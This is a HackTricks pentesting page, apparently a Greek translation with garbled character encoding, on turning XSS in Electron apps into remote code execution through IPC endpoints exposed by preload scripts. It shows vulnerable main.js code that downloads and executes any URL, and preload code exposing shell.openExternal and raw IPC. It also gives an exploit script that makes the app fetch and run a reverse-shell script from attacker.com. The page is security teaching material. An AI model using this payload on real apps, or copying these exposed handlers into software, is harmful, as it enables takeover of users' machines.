# Electron contextIsolation RCE via IPC

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î‘Î½ Ï„Î¿ preload script ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î­Î½Î± IPC endpoint Î±Ï€ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ main.js, Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± renderer Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ ÎºÎ±Î¹ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î¼Î¹Î± RCE.

**ÎŸÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î­Ï‡Î¿Ï…Î½ Î»Î·Ï†Î¸ÎµÎ¯ Î±Ï€ÏŒ ÎµÎ´Ï** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Î”ÎµÎ¯Ï„Îµ Ï„Î¿ Î²Î¯Î½Ï„ÎµÎ¿ Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.

## Example 0

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï„Î¿Ï… Ï€ÏÏ‚ Ï„Î¿ MS Teams ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏ„Î·ÎºÎµ Ï„Î¿ XSS Î³Î¹Î± RCE ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î´Î¹Î±Ï†Î¬Î½ÎµÎ¹ÎµÏ‚, Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î­Î½Î± Ï€Î¿Î»Ï Î²Î±ÏƒÎ¹ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±):

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Example 1

Î”ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Ï„Î¿ `main.js` Î±ÎºÎ¿ÏÎµÎ¹ ÏƒÏ„Î¿ `getUpdate` ÎºÎ±Î¹ Î¸Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÎ¹ ÎºÎ±Î¹ Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ URL** Ï€ÎµÏÎ¬ÏƒÎµÎ¹.\
Î”ÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï€ÏÏ‚ Ï„Î¿ `preload.js` **ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ IPC** Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î¿ main.
```javascript
// Part of code of main.js
ipcMain.on('getUpdate', (event, url) => {
console.log('getUpdate: ' + url)
mainWindow.webContents.downloadURL(url)
mainWindow.download_url = url
});

mainWindow.webContents.session.on('will-download', (event, item, webContents) => {
console.log('downloads path=' + app.getPath('downloads'))
console.log('mainWindow.download_url=' + mainWindow.download_url);
url_parts = mainWindow.download_url.split('/')
filename = url_parts[url_parts.length-1]
mainWindow.downloadPath = app.getPath('downloads') + '/' + filename
console.log('downloadPath=' + mainWindow.downloadPath)
// Set the save path, making Electron not to prompt a save dialog.
item.setSavePath(mainWindow.downloadPath)

item.on('updated', (event, state) => {
if (state === 'interrupted') {
console.log('Download is interrupted but can be resumed')
}
else if (state === 'progressing') {
if (item.isPaused()) console.log('Download is paused')
else console.log(`Received bytes: ${item.getReceivedBytes()}`)
}
})

item.once('done', (event, state) => {
if (state === 'completed') {
console.log('Download successful, running update')
fs.chmodSync(mainWindow.downloadPath, 0755);
var child = require('child_process').execFile;
child(mainWindow.downloadPath, function(err, data) {
if (err) { console.error(err); return; }
console.log(data.toString());
});
}
else console.log(`Download failed: ${state}`)
})
})
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:
```html
<script>
electronSend("getUpdate","https://attacker.com/path/to/revshell.sh");
</script>
```
## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 2

Î‘Î½ Ï„Î¿ preload script ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î¬Î¼ÎµÏƒÎ± ÏƒÏ„Î¿Î½ renderer Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î¿ `shell.openExternal`, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ RCE
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
shell.openExternal(url);
};
```
## Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± 3

Î•Î¬Î½ Ï„Î¿ preload script ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Ï„ÏÏŒÏ€Î¿Ï…Ï‚ Î³Î¹Î± Ï€Î»Î®ÏÎ· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼Îµ Ï„Î· Î²Î±ÏƒÎ¹ÎºÎ® Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±, Î¼Î¹Î± XSS Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î³ÎµÎ³Î¿Î½ÏŒÏ‚. ÎŸ Î±Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚ Î±Ï…Ï„Î¿Ï ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Ï„Î¹ ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î· Î²Î±ÏƒÎ¹ÎºÎ® Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÏŒÏƒÎ¿Î½ Î±Ï†Î¿ÏÎ¬ Ï„Î¿ IPC.
```javascript
window.electronListen = (event, cb) => {
ipcRenderer.on(event, cb);
};

window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
